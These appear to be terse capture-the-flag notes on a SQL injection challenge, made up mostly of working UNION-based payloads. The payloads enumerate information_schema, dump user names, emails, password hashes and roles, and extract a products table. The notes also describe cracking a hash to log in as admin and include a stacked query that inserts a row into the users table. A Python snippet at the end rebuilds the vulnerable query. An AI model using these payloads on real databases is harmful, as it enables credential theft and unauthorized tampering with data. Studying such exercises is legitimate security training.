query = "t' || 'test"
query = "' OR 1=2) UNION SELECT 1,2,3) -- comment '"
query = "bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,6,-- comment '"

bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,TABLE_NAME,7 FROM information_schema.tables -- comment '

saw table called users

bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,COLUMN_NAME,7 FROM information_schema.columns WHERE table_name = 'users' -- comment '

bigion' OR 1=2)) UNION SELECT 1,fname,lname,email,password,role,7 FROM users -- comment '

saw bunch of admin accounts one is admin

I check the hash on crackstation and get the password, then login as admin and get the flag

Now try products

bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,COLUMN_NAME,7 FROM information_schema.columns WHERE table_name = 'products' -- comment '

got columns

and then just list them all and found a flag

bigion' OR 1=2)) UNION SELECT 1,code,owner,bu,name,released,7 FROM products -- comment '



id, name, category, bu, owner, code, released

bigion' OR 1=2)) UNION SELECT 1,fname,lname,email,password,role,7 FROM users; INSERT INTO users (id, fname, lname, email, password, role, mobile, city, state) VALUES (1,2,3,4,5,6,7,8,9) -- comment '


x = f"((SELECT * FROM table WHERE something LIKE '%{query}%' OR name LIKE '%{query}%') AND bu IS NOT NULL) ORDER BY category'"

print(x)